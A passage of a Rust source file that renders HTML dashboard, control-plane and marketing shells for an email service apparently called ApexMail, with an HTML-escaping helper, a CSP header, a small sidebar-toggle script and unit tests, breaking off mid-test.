use crate::icons::{render_icon, IconRenderOptions};

/// Escape HTML special characters to prevent XSS in rendered shell output.
pub fn html_escape(s: &str) -> String {
    let mut escaped = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => escaped.push_str("&amp;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            '"' => escaped.push_str("&quot;"),
            '\'' => escaped.push_str("&#x27;"),
            _ => escaped.push(c),
        }
    }
    escaped
}

pub struct ShellSpec {
    pub name: &'static str,
    pub contract_id: &'static str,
    pub status: &'static str,
}

pub const SHELLS: &[ShellSpec] = &[
    ShellSpec {
        name: "WebDashboardShell",
        contract_id: "shell/web-dashboard",
        status: "implemented",
    },
    ShellSpec {
        name: "ControlPlaneShell",
        contract_id: "shell/control-plane",
        status: "implemented",
    },
];

const WEB_LAYOUT_SOURCE: &str = include_str!("../baselines/web/dashboard-layout.baseline.txt");
const WEB_SIDEBAR_SOURCE: &str = include_str!("../baselines/web/sidebar.baseline.txt");
const WEB_HEADER_SOURCE: &str = include_str!("../baselines/web/header.baseline.txt");
const WEB_IMPERSONATION_SOURCE: &str =
    include_str!("../baselines/web/impersonation-banner.baseline.txt");
const WEB_TOAST_STORE_SOURCE: &str = include_str!("../baselines/web/use-toast.baseline.txt");
const CONTROL_PLANE_SHELL_SOURCE: &str =
    include_str!("../baselines/control-plane/control-plane-shell.baseline.txt");
const CONTROL_PLANE_SIDEBAR_SOURCE: &str =
    include_str!("../baselines/control-plane/sidebar.baseline.txt");

pub fn ui_store_persistence_key() -> &'static str {
    "apexmail-ui"
}

pub fn toast_store_global() -> &'static str {
    "__apexmailToastStore__"
}

pub fn toast_remove_delay_ms() -> usize {
    5_000
}

pub fn header_shortcut_hint() -> &'static str {
    "Cmd K"
}

pub fn theme_storage_key() -> &'static str {
    "apexmail-ui:theme"
}

pub fn shell_shortcut_registry() -> &'static [(&'static str, &'static str)] {
    const SHORTCUTS: &[(&str, &str)] = &[
        ("mod+k", "global-search"),
        ("mod+b", "toggle-sidebar"),
        ("mod+shift+d", "toggle-theme"),
    ];
    SHORTCUTS
}

fn render_shortcut_contract() -> String {
    let entries = shell_shortcut_registry()
        .iter()
        .map(|(shortcut, action)| {
            format!("<span data-shortcut=\"{shortcut}\" data-shortcut-action=\"{action}\"></span>")
        })
        .collect::<Vec<_>>()
        .join("");
    format!(
        "<section aria-label=\"Keyboard shortcuts\" data-keyboard-shortcuts>{entries}</section>"
    )
}

/// Returns an inline `<script>` block that provides client-side interactivity
/// for mobile sidebar toggling, used by both the Web Dashboard and Control
/// Plane shells. Handles:
/// - Click on the burger menu button toggles the mobile sidebar open/closed
/// - Click on the backdrop overlay closes the sidebar
/// - Escape key closes the sidebar
/// - Resizing past the breakpoint closes the sidebar
///
/// The script tag will receive a CSP nonce via `inject_script_nonce` in
/// `browser_html_response`, so it executes safely under the browser CSP.
pub fn mobile_menu_script() -> String {
    // Minified JS that provides click + keyboard + resize handling for mobile
    // sidebars used by both the Web Dashboard and Control Plane shells.
    let script = r#"(function(){'use strict';function e(e,t){var n=document.getElementById(e);if(n){var o=!n.classList.contains('-translate-x-full');n.classList.toggle('-translate-x-full'),n.classList.toggle('translate-x-0');var r=document.querySelector('[aria-controls="'+e+'"]');r&&r.setAttribute('aria-expanded',String(o))}}function t(e,t){var n=document.getElementById(e);n&&(n.classList.remove('-translate-x-full'),n.classList.add('translate-x-0'),document.querySelector('[aria-controls="'+e+'"]')&&document.querySelector('[aria-controls="'+e+'"]').setAttribute('aria-expanded','true'))}function n(e){var t=document.getElementById(e);t&&(t.classList.remove('translate-x-0'),t.classList.add('-translate-x-full'));var n=document.querySelector('[aria-controls="'+e+'"]');n&&(n.setAttribute('aria-expanded','false'),n.classList.remove('is-active'))}function o(o){var r=o.currentTarget,i=r.getAttribute('aria-controls');i&&(o.preventDefault(),o.stopPropagation(),r.classList.contains('is-active')?n(i):t(i),r.classList.toggle('is-active'))}function r(e){'Escape'!==e.key||function(){var e=document.querySelector('#mobile-sidebar.translate-x-0,#control-plane-mobile-sidebar.translate-x-0');e&&n(e.id)}()}document.querySelectorAll('[data-mobile-menu-breakpoint]').forEach(function(e){'BUTTON'===e.tagName&&e.addEventListener('click',o)}),document.addEventListener('keydown',r);var i=new ResizeObserver(function(){window.innerWidth>=768&&document.querySelectorAll('#mobile-sidebar.translate-x-0,#control-plane-mobile-sidebar.translate-x-0').forEach(function(e){n(e.id)})});i.observe(document.body)})();"#;
    format!("<script>{script}</script>")
}

fn shell_icon(name: &str, class_name: &str) -> String {
    render_icon(
        name,
        IconRenderOptions {
            size: 18,
            stroke_width: 2.0,
            class_name: Some(class_name),
        },
    )
    .unwrap_or_default()
}

/// Content-Security-Policy header value for all shell surfaces.
///
/// Restricts script sources to same-origin and inline style hashes,
/// disables `object-src`, `frame-src`, and `base-uri` to prevent
/// XSS and data injection. The `strict-dynamic` fallback preserves
/// existing script execution while blocking arbitrary inline handlers.
pub fn shell_csp_header() -> &'static str {
    "default-src 'self'; \
     script-src 'self' 'strict-dynamic'; \
     style-src 'self' 'unsafe-inline'; \
     img-src 'self' data: https:; \
     font-src 'self' data:; \
     connect-src 'self'; \
     frame-src 'none'; \
     object-src 'none'; \
     base-uri 'self'; \
     form-action 'self'; \
     upgrade-insecure-requests"
}

/// Render a `<meta http-equiv="Content-Security-Policy">` tag for embedding
/// in shell HTML output. This provides defense-in-depth alongside HTTP
/// response headers set by the Axum server layer.
pub fn render_csp_meta_tag() -> String {
    format!(
        "<meta http-equiv=\"Content-Security-Policy\" content=\"{}\">",
        shell_csp_header()
    )
}

pub fn shell_source_catalog() -> [(&'static str, &'static str); 7] {
    [
        ("web_layout", WEB_LAYOUT_SOURCE),
        ("web_sidebar", WEB_SIDEBAR_SOURCE),
        ("web_header", WEB_HEADER_SOURCE),
        ("web_impersonation_banner", WEB_IMPERSONATION_SOURCE),
        ("web_toast_store", WEB_TOAST_STORE_SOURCE),
        ("control_plane_shell", CONTROL_PLANE_SHELL_SOURCE),
        ("control_plane_sidebar", CONTROL_PLANE_SIDEBAR_SOURCE),
    ]
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellHeader<'a> {
    pub search_query: &'a str,
    pub unread_count: usize,
    pub avatar_fallback: &'a str,
    pub mobile_menu_open: bool,
}

impl<'a> ShellHeader<'a> {
    pub fn render_html(&self) -> String {
        let theme_icon = shell_icon("moon", "h-4 w-4");
        let safe_avatar = html_escape(self.avatar_fallback);
        
        format!(
            "<header class=\"apex-console-header sticky top-0 z-20 flex h-16 items-center justify-between border-b border-surface-200/60 bg-white px-8\">\
                <div class=\"flex items-center gap-4\">\
                    <button type=\"button\" class=\"md:hidden inline-flex h-10 w-10 items-center justify-center rounded-lg text-surface-500 hover:bg-surface-50 hover:text-surface-950 transition-colors\" aria-label=\"{menu_label} navigation menu\" aria-expanded=\"{expanded}\" aria-controls=\"mobile-sidebar\" data-mobile-menu-breakpoint=\"md\" data-shortcut=\"mod+b\">{menu_icon}</button>\
                    <div class=\"relative hidden md:block\">\
                        <button aria-label=\"Search\" data-shortcut=\"mod+k\" class=\"flex items-center gap-3 px-3 py-1.5 text-xs font-medium text-surface-400 bg-surface-50 border border-surface-200/60 rounded-lg hover:bg-surface-100 hover:text-surface-600 transition-all min-w-[200px]\">\
                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><circle cx=\"11\" cy=\"11\" r=\"8\"/><path d=\"m21 21-4.3-4.3\"/></svg>\
                            <span>Search...</span>\
                            <kbd class=\"ml-auto text-[10px] opacity-50 font-sans\">⌘K</kbd>\
                        </button>\
                    </div>\
                </div>\
                <div class=\"flex items-center gap-4\">\
                    <div class=\"flex items-center gap-1 pr-4 border-r border-surface-100\">\
                        <span class=\"text-[10px] font-bold uppercase tracking-widest text-surface-400\">Free Plan — 30K / mo</span>\
                    </div>\
                    <button type=\"button\" aria-label=\"Toggle dark mode\" data-theme-toggle=\"true\" class=\"inline-flex h-9 w-9 items-center justify-center rounded-lg text-surface-400 hover:bg-surface-50 hover:text-surface-950 transition-colors\">\
                        {theme_icon}\
                    </button>\
                    <div class=\"flex items-center gap-3 pl-2\">\
                        <div class=\"text-right hidden sm:block\">\
                            <p class=\"text-xs font-bold text-surface-950\">Engineering</p>\
                            <p class=\"text-[10px] font-medium text-surface-500\">admin@apexmail.ee</p>\
                        </div>\
                        <div class=\"apex-avatar relative flex shrink-0 h-9 w-9 rounded-full bg-primary/10 border border-primary/20 items-center justify-center\" role=\"button\" aria-label=\"User menu\" tabindex=\"0\">\
                            <span class=\"text-primary font-bold text-xs tracking-tighter\">{avatar}</span>\
                        </div>\
                    </div>\
                </div>\
            </header>",
            menu_icon = shell_icon("menu", "h-5 w-5"),
            menu_label = if self.mobile_menu_open { "Close" } else { "Open" },
            expanded = if self.mobile_menu_open { "true" } else { "false" },
            theme_icon = theme_icon,
            avatar = safe_avatar,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImpersonationBanner<'a> {
    pub tenant_id: &'a str,
    pub operator_name: &'a str,
    pub time_remaining: &'a str,
    pub end_session_error: Option<&'a str>,
    pub ending_session: bool,
}

impl<'a> ImpersonationBanner<'a> {
    pub fn render_html(&self) -> String {
        let error = self
            .end_session_error
            .map(|value| {
                format!(
                    "<span class=\"text-[11px] font-bold text-white uppercase tracking-tight\">{}</span>",
                    html_escape(value)
                )
            })
            .unwrap_or_default();
        let safe_tenant = html_escape(self.tenant_id);
        let safe_operator = html_escape(self.operator_name);
        let safe_time = html_escape(self.time_remaining);
        format!(
            "<div class=\"fixed top-0 left-0 right-0 z-[100] bg-primary text-white border-b border-brand-700\" role=\"alert\" aria-live=\"polite\"><div class=\"max-w-7xl mx-auto px-6 py-2\"><div class=\"flex items-center justify-between\"><div class=\"flex items-center gap-6\"><div class=\"flex items-center gap-2 bg-white/10 px-2 py-0.5 rounded-sm\"><span class=\"text-[10px] font-bold uppercase tracking-[0.2em]\">Impersonation Active</span></div><div class=\"flex items-center gap-2 text-[11px] font-bold uppercase tracking-tight\"><span class=\"opacity-70\">Tenant:</span><span class=\"bg-white/10 px-1.5 py-0.5 rounded-sm\">{}</span></div><div class=\"hidden md:flex items-center gap-2 text-[11px] font-bold uppercase tracking-tight\"><span class=\"opacity-70\">Operator:</span><span>{}</span></div></div><div class=\"flex items-center gap-6\">{}<div class=\"flex items-center gap-2 text-[11px] font-bold uppercase tracking-tight\"><span class=\"opacity-70\">Expires:</span><span class=\"font-mono bg-white/20 px-1.5 py-0.5 rounded-sm\">{}</span></div><button class=\"px-3 py-1 bg-white text-primary rounded-sm text-[11px] font-bold uppercase tracking-widest hover:bg-surface-50 transition-colors\">{}</button></div></div></div></div>",
            safe_tenant,
            safe_operator,
            error,
            safe_time,
            if self.ending_session { "Ending..." } else { "Terminate" },
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToastSurface<'a> {
    pub toasts: Vec<&'a str>,
}

impl<'a> ToastSurface<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<section aria-label=\"Toast notifications\" data-toast-store=\"{}\" data-remove-delay=\"{}\"><div role=\"region\" aria-live=\"polite\" aria-label=\"Notifications\" class=\"fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]\">{}</div></section>",
            toast_store_global(),
            toast_remove_delay_ms(),
            self.toasts.join(""),
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WebDashboardShell<'a> {
    pub sidebar_collapsed: bool,
    pub mobile_menu_open: bool,
    pub child_html: &'a str,
    pub header: ShellHeader<'a>,
    pub impersonation_banner: Option<ImpersonationBanner<'a>>,
    pub toast_surface: Option<ToastSurface<'a>>,
    pub current_path: &'a str,
}

impl<'a> WebDashboardShell<'a> {
    pub fn render_html(&self) -> String {
        let sidebar_width = if self.sidebar_collapsed {
            "w-20"
        } else {
            "w-64"
        };
        let mobile_overlay = if self.mobile_menu_open {
            format!(
                "<div class=\"fixed inset-0 z-40 bg-black/50 md:hidden\" aria-hidden=\"true\" data-close-on-escape=\"true\"></div>\
                <div id=\"mobile-sidebar\" role=\"navigation\" aria-label=\"Mobile navigation\" data-mobile-menu-breakpoint=\"md\" data-close-on-escape=\"true\" tabindex=\"-1\" class=\"fixed inset-y-0 left-0 z-50 w-[min(20rem,calc(100vw-2rem))] md:hidden\">{}</div>",
                render_web_sidebar(self.current_path)
            )
        } else {
            String::new()
        };
        let banner = self
            .impersonation_banner
            .as_ref()
            .map(ImpersonationBanner::render_html)
            .unwrap_or_default();
        let shortcut_contract = render_shortcut_contract();
        let toast_surface = self
            .toast_surface
            .as_ref()
            .map(ToastSurface::render_html)
            .unwrap_or_default();
        let sidebar_content = render_web_sidebar(self.current_path);
        let mobile_script = mobile_menu_script();
        
        format!(
            "<div class=\"apex-console-shell min-h-screen bg-[#fcfcfc] flex\" data-theme-mode=\"system\" data-theme-storage-key=\"{theme_key}\">\
            {banner}{shortcut_contract}\
            <aside class=\"hidden md:flex flex-col fixed left-0 top-0 h-screen {sidebar_width} z-30 transition-all duration-300\" data-sidebar-storage-key=\"{sidebar_key}\" aria-label=\"Primary sidebar navigation\">\
                {sidebar_content}\
            </aside>\
            {mobile_overlay}\
            <div class=\"flex-1 flex flex-col min-h-screen transition-all duration-300 ml-0 md:ml-{ml_val}\">\
                {header}\
                <main class=\"apex-console-main relative p-6 lg:p-10 flex-1\">\
                    <div class=\"max-w-7xl mx-auto\">\
                        {child_html}\
                    </div>\
                </main>\
            </div>\
            {toast_surface}{mobile_script}\
            </div>",
            theme_key = theme_storage_key(),
            banner = banner,
            shortcut_contract = shortcut_contract,
            sidebar_width = sidebar_width,
            sidebar_key = ui_store_persistence_key(),
            sidebar_content = sidebar_content,
            mobile_overlay = mobile_overlay,
            ml_val = if self.sidebar_collapsed { "20" } else { "64" },
            header = self.header.render_html(),
            child_html = self.child_html,
            toast_surface = toast_surface,
            mobile_script = mobile_script,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OperationalBanner<'a> {
    pub tone: &'a str,
    pub message: &'a str,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ControlPlaneShell<'a> {
    pub mobile_menu_open: bool,
    pub user_role: &'a str,
    pub page_title: &'a str,
    pub page_description: &'a str,
    pub banners: Vec<OperationalBanner<'a>>,
    pub child_html: &'a str,
    pub current_path: &'a str,
}

impl<'a> ControlPlaneShell<'a> {
    pub fn render_html(&self) -> String {
        let banner_markup = self
            .banners
            .iter()
            .map(|banner| {
                format!(
                    "<div class=\"px-6 py-2 text-[11px] font-bold uppercase tracking-tight border-b border-white/10 {}\">{}</div>",
                    control_plane_banner_class(banner.tone),
                    html_escape(banner.message)
                )
            })
            .collect::<Vec<_>>()
            .join("");
            
        let sidebar_content = render_cp_sidebar(self.current_path);
        let mobile_script = mobile_menu_script();
        let shortcut_contract = render_shortcut_contract();
        
        format!(
            "<div class=\"apex-cp-shell min-h-screen bg-[#fcfcfc] flex\" data-theme-mode=\"system\" data-theme-storage-key=\"{theme_key}\">\
            {shortcut_contract}\
            <aside class=\"hidden md:flex flex-col fixed left-0 top-0 h-screen w-64 z-30\" data-user-role=\"{role}\">\
                {sidebar_content}\
            </aside>\
            <div id=\"control-plane-mobile-sidebar\" role=\"navigation\" aria-label=\"Control plane mobile navigation\" data-mobile-menu-breakpoint=\"md\" data-close-on-escape=\"true\" tabindex=\"-1\" class=\"md:hidden fixed left-0 top-0 h-screen z-50 transition-transform duration-300 -translate-x-full\">\
                <aside class=\"h-full w-[min(20rem,calc(100vw-2rem))] bg-white\">{sidebar_content}</aside>\
            </div>\
            <div class=\"flex-1 flex flex-col min-h-screen ml-0 md:ml-64\">\
                {banner_markup}\
                <header class=\"h-16 border-b border-surface-200/60 bg-white flex items-center justify-between px-8 sticky top-0 z-20\">\
                    <div class=\"flex items-center gap-4\">\
                        <button type=\"button\" class=\"md:hidden inline-flex h-10 w-10 items-center justify-center rounded-lg text-surface-500 hover:bg-surface-50 hover:text-surface-950 transition-colors\" aria-label=\"{menu_label} navigation menu\" aria-expanded=\"{expanded}\" aria-controls=\"control-plane-mobile-sidebar\" data-mobile-menu-breakpoint=\"md\">{menu_icon}</button>\
                        <div class=\"flex items-baseline gap-3 min-w-0\">\
                            <h1 class=\"text-lg font-bold text-surface-950 tracking-tight\">{page_title}</h1>\
                            <p class=\"hidden sm:block text-xs font-medium text-surface-400 truncate\">{page_description}</p>\
                        </div>\
                    </div>\
                    <div class=\"flex items-center gap-6\">\
                        <div class=\"hidden lg:flex items-center gap-2 px-3 py-1 bg-surface-50 rounded-full border border-surface-200/60\">\
                            <span class=\"w-1.5 h-1.5 rounded-full bg-success-500 animate-pulse\"></span>\
                            <span class=\"text-[10px] font-bold uppercase tracking-widest text-surface-500\">Fleet Healthy</span>\
                        </div>\
                        <div class=\"flex items-center gap-2 text-xs font-semibold text-surface-500\">\
                            <span class=\"opacity-50\">Role:</span>\
                            <span class=\"text-primary\">{role}</span>\
                        </div>\
                    </div>\
                </header>\
                <main class=\"p-8 flex-1\">\
                    <div class=\"max-w-7xl mx-auto\">\
                        {child_html}\
                    </div>\
                </main>\
            </div>\
            {mobile_script}\
            </div>",
            theme_key = theme_storage_key(),
            shortcut_contract = shortcut_contract,
            role = html_escape(self.user_role),
            sidebar_content = sidebar_content,
            banner_markup = banner_markup,
            page_title = html_escape(self.page_title),
            page_description = html_escape(self.page_description),
            menu_label = if self.mobile_menu_open { "Close" } else { "Open" },
            expanded = if self.mobile_menu_open { "true" } else { "false" },
            menu_icon = shell_icon("menu", "h-5 w-5"),
            child_html = self.child_html,
            mobile_script = mobile_script,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MarketingShell<'a> {
    pub child_html: &'a str,
}

fn render_marketing_header() -> String {
    "<header id=\"site-header\" data-marketing-shell=\"header\" class=\"fixed top-0 left-0 right-0 z-50 transition-all duration-300 bg-transparent border-b border-transparent\">\
         <nav class=\"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8\">\
         <div class=\"flex items-center justify-between h-16 lg:h-20\">\
         <a href=\"/\" class=\"flex items-center gap-2 group\">\
         <div class=\"w-8 h-8 rounded-sm bg-surface-950 flex items-center justify-center border border-surface-800\">\
         <svg xmlns=\"http://www.w3.org/2000/svg\" class=\"w-5 h-5 text-white\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><polygon points=\"13 2 3 14 12 14 11 22 21 10 12 10 13 2\"/></svg>\
         </div><span class=\"text-xl font-bold text-surface-950 tracking-tighter uppercase\">ApexMail</span></a>\
         <div class=\"hidden lg:flex items-center gap-6\">\
         <a href=\"/features\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 hover:text-surface-950\">Features</a>\
         <a href=\"/pricing\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 hover:text-surface-950\">Pricing</a>\
         <a href=\"/docs\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 hover:text-surface-950\">Docs</a>\
         </div>\
         <div class=\"flex items-center gap-3\">\
         <a href=\"/login\" class=\"text-xs font-bold uppercase tracking-widest text-surface-600 px-3 py-2\">Login</a>\
         <a href=\"/signup\" class=\"btn-primary px-4 py-2 text-xs\">Get Started</a>\
         </div></div></nav></header>"
        .to_string()
}

fn render_marketing_footer() -> String {
    "<footer data-marketing-shell=\"footer\" class=\"bg-surface-950 text-white py-12\">\
         <div class=\"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8\">\
         <div class=\"grid grid-cols-2 md:grid-cols-4 gap-8 mb-12\">\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Product</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/features\">Features</a></li><li><a href=\"/pricing\">Pricing</a></li></ul></div>\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Platform</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/docs\">API</a></li><li><a href=\"/status\">Status</a></li></ul></div>\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Legal</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/privacy\">Privacy</a></li><li><a href=\"/terms\">Terms</a></li></ul></div>\
         <div><h4 class=\"text-xs font-bold uppercase tracking-widest mb-6 opacity-40\">Company</h4><ul class=\"space-y-4 text-sm text-surface-400\"><li><a href=\"/about\">About</a></li><li><a href=\"/contact\">Contact</a></li></ul></div>\
         </div><div class=\"pt-8 border-t border-white/5 flex flex-col md:flex-row justify-between items-center gap-4 text-[11px] text-surface-500 font-bold uppercase tracking-widest\">\
         <p>© 2026 APEXMAIL TECH LTD. ALL RIGHTS RESERVED.</p><div class=\"flex gap-6\"><a href=\"#\">Twitter</a><a href=\"#\">GitHub</a></div>\
         </div></div></footer>"
        .to_string()
}

impl<'a> MarketingShell<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<div class=\"font-apex antialiased text-[17px] leading-[1.6] min-h-screen safe-area-inset-bottom flex flex-col\">{}<main class=\"flex-1 pt-16 lg:pt-20\">{}</main>{}<div data-marketing-shell=\"cookie-consent\"></div><button data-marketing-shell=\"back-to-top\"></button></div>",
            render_marketing_header(),
            self.child_html,
            render_marketing_footer(),
        )
    }
}

fn control_plane_banner_class(tone: &str) -> &'static str {
    match tone {
        "critical" => "bg-destructive/10 text-destructive border-destructive/20",
        "warning" => "border-warning/20 bg-warning/10 text-warning",
        _ => "bg-primary/10 text-primary border-primary/20",
    }
}

fn render_sidebar_content(
    items: &[(&str, &str, &str)],
    link_classes: &str,
    current_path: &str,
) -> String {
    let base_classes = link_classes;
    let links = items
        .iter()
        .map(|(label, href, icon_name)| {
            let icon = shell_icon(icon_name, "h-4 w-4");
            let is_active = current_path == *href
                || (href != &"/" && current_path.starts_with(href))
                || (href == &"/dashboard" && (current_path == "/" || current_path == "/cp" || current_path == "/dashboard"));
            let active_class = " aria-current=\"page\"";
            
            let classes = if is_active {
                "flex items-center gap-3 px-3 py-2 text-sm font-semibold transition-all rounded-lg bg-primary/5 text-primary"
            } else {
                "flex items-center gap-3 px-3 py-2 text-sm font-medium transition-all rounded-lg text-surface-600 hover:text-surface-950 hover:bg-surface-50"
            };

            let icon_color = if is_active { "text-primary" } else { "text-surface-400" };
            let icon_wrap = format!(
                "<span class=\"w-5 h-5 flex items-center justify-center transition-colors {}\">{}</span>",
                icon_color, icon
            );
            format!(
                "<a href=\"{}\" class=\"{}\"{}>{}{}</a>",
                href,
                classes,
                if is_active { active_class } else { "" },
                icon_wrap,
                label,
            )
        })
        .collect::<Vec<_>>()
        .join("");
    format!(
        "<div class=\"flex flex-col gap-1 px-3 py-2\">{}</div>",
        links
    )
}

fn render_web_sidebar(current_path: &str) -> String {
    let main_items = [
        ("Dashboard", "/dashboard", "home"),
        ("Campaigns", "/campaigns", "mail"),
        ("Contacts", "/contacts", "users"),
        ("Lists", "/lists", "list"),
        ("Templates", "/templates", "layout-template"),
    ];
    let configure_items = [
        ("Domains", "/domains", "globe"),
        ("API Keys", "/settings/api-keys", "key"),
        ("Webhooks", "/settings/webhooks", "zap"),
        ("Analytics", "/analytics", "bar-chart-3"),
    ];
    let account_items = [
        ("Billing", "/settings/billing", "credit-card"),
        ("Settings", "/settings", "settings"),
    ];

    let render_section = |title: &str, items: &[(&str, &str, &str)]| {
        format!(
            "<div class=\"space-y-1 mb-6\">\
                <h3 class=\"px-6 text-[10px] font-bold uppercase tracking-[0.2em] text-surface-400 mb-2\">{}</h3>\
                {}</div>",
            title,
            render_sidebar_content(items, "", current_path)
        )
    };

    let content = format!(
        "{}{}{}",
        render_section("Main", &main_items),
        render_section("Configure", &configure_items),
        render_section("Account", &account_items)
    );

    format!(
        "<div class=\"apex-console-sidebar flex flex-col h-full bg-white text-surface-900 border-r border-surface-200/60 transition-all w-64\">\
         <div class=\"p-6 mb-4\"><div class=\"flex items-center gap-2\">\
         <span class=\"apex-sidebar-brand text-xl font-bold tracking-tighter transition-all hover:opacity-80\"><span class=\"text-primary\">Apex</span><span class=\"text-surface-950\">Mail</span></span></div></div>\
         <nav class=\"flex-1 overflow-y-auto\" data-sidebar=\"primary\" aria-label=\"Primary sidebar navigation\">{}</nav>\
         <div class=\"p-4 border-t border-surface-100\"><a href=\"/logout\" class=\"flex items-center gap-3 px-4 py-2 text-xs font-bold uppercase tracking-widest text-surface-500 hover:text-surface-950 transition-colors\"><span>Sign Out</span></a></div></div>",
        content
    )
}

fn render_cp_sidebar(current_path: &str) -> String {
    let items = [
        ("Overview", "/dashboard", "home"),
        ("Tenants", "/tenants", "building"),
        ("Infrastructure", "/infrastructure", "server"),
        ("Security", "/settings/security", "shield"),
        ("Audit Logs", "/audit", "file-text"),
        ("Sales Console", "/sales", "trending-up"),
    ];

    let content = format!(
        "<div class=\"space-y-1 mb-6\">\
            <h3 class=\"px-6 text-[10px] font-bold uppercase tracking-[0.2em] text-surface-400 mb-2\">Control Plane</h3>\
            {}</div>",
        render_sidebar_content(&items, "", current_path)
    );

    format!(
        "<div class=\"apex-cp-sidebar flex flex-col h-full bg-white text-surface-900 border-r border-surface-200/60 w-64\">\
         <div class=\"p-6 mb-4\"><div class=\"flex flex-col gap-0.5\">\
         <span class=\"apex-sidebar-brand text-xl font-bold tracking-tighter\"><span class=\"text-primary\">Apex</span><span class=\"text-surface-950\">Mail</span></span>\
         <span class=\"text-[10px] font-bold uppercase tracking-[0.2em] text-surface-400\">Operations</span></div></div>\
         <nav class=\"flex-1 overflow-y-auto cp-sidebar-nav\" data-sidebar=\"primary\" aria-label=\"Control Plane navigation\">{}</nav>\
         <div class=\"p-6 border-t border-surface-100 text-[10px] text-surface-500 uppercase tracking-widest font-bold\">System v2.4.0-stable</div></div>",
        content
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn exposes_shell_specs() {
        assert!(SHELLS.iter().any(|shell| shell.name == "WebDashboardShell"));
        assert!(SHELLS.iter().any(|shell| shell.name == "ControlPlaneShell"));
        assert_eq!(SHELLS.len(), 2);
    }

    #[test]
    fn shell_sources_capture_expected_contracts() {
        assert!(WEB_LAYOUT_SOURCE.contains("ImpersonationBanner"));
        assert!(WEB_SIDEBAR_SOURCE.contains("aria-current"));
        assert!(WEB_HEADER_SOURCE.contains("⌘K"));
        assert!(WEB_IMPERSONATION_SOURCE.contains("Impersonation Mode"));
        assert!(WEB_TOAST_STORE_SOURCE.contains("__apexmailToastStore__"));
        assert!(CONTROL_PLANE_SHELL_SOURCE.contains("Operator Shortcuts"));
        assert!(CONTROL_PLANE_SIDEBAR_SOURCE.contains("Control Plane"));
        assert_eq!(shell_source_catalog().len(), 7);
    }

    #[test]
    fn exposes_sidebar_persistence_and_toast_contracts() {
        assert_eq!(ui_store_persistence_key(), "apexmail-ui");
        assert_eq!(theme_storage_key(), "apexmail-ui:theme");
        assert_eq!(toast_store_global(), "__apexmailToastStore__");
        assert_eq!(toast_remove_delay_ms(), 5000);
        assert_eq!(header_shortcut_hint(), "Cmd K");
        assert!(shell_shortcut_registry().contains(&("mod+k", "global-search")));
    }

    #[test]
    fn renders_header_banner_and_toast_surface() {
        let header = ShellHeader {
            search_query: "campaigns",
            unread_count: 3,
            avatar_fallback: "AM",
            mobile_menu_open: false,
        }
        .render_html();
        let banner = ImpersonationBanner {
            tenant_id: "tenant_123",
            operator_name: "Operator Jane",
            time_remaining: "9:58",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        let toast_surface = ToastSurface {
            toasts: vec!["<div>Toast</div>"],
        }
        .render_html();

        // Minimal header (reference design): search affordance via a button
        // with the mod+k shortcut, theme toggle, avatar — no combobox input,
        // no unread badge. The notification count is surfaced via the toast
        // surface, not the header.
        assert!(header.contains("aria-label=\"Search\""));
        assert!(header.contains("data-shortcut=\"mod+k\""));
        assert!(header.contains("data-theme-toggle=\"true\""));
        assert!(header.contains("data-mobile-menu-breakpoint=\"md\""));
        assert!(header.contains("aria-label=\"Open navigation menu\""));
        assert!(banner.contains("Impersonation Active"));
        assert!(banner.contains("tenant_123"));
        assert!(banner.contains("Terminate"));
        assert!(toast_surface.contains("aria-label=\"Notifications\""));
        assert!(toast_surface.contains("data-toast-store=\"__apexmailToastStore__\""));
        assert!(toast_surface.contains("data-remove-delay=\"5000\""));
    }

    #[test]
    fn renders_web_control_plane_and_marketing_shells() {
        let web = WebDashboardShell {
            sidebar_collapsed: true,
            mobile_menu_open: true,
            child_html: "<section>Dashboard</section>",
            header: ShellHeader {
                search_query: "reports",
                unread_count: 1,
                avatar_fallback: "AR",
                mobile_menu_open: true,
            },
            impersonation_banner: Some(ImpersonationBanner {
                tenant_id: "tenant_7",
                operator_name: "Admin",
                time_remaining: "3:21",
                end_session_error: Some("Could not end impersonation session."),
                ending_session: false,
            }),
            toast_surface: Some(ToastSurface {
                toasts: vec!["<div>Saved</div>"],
            }),
            current_path: "/dashboard",
        }
        .render_html();
        let control = ControlPlaneShell {
            mobile_menu_open: true,
            user_role: "admin",
            page_title: "Operations",
            page_description: "Monitor the fleet.",
            banners: vec![OperationalBanner {
                tone: "warning",
                message: "Safe mode active",
            }],
            child_html: "<section>Ops</section>",
            current_path: "/dashboard",
        }
        .render_html();
        let marketing = MarketingShell {
            child_html: "<section>Hero</section>",
        }
        .render_html();

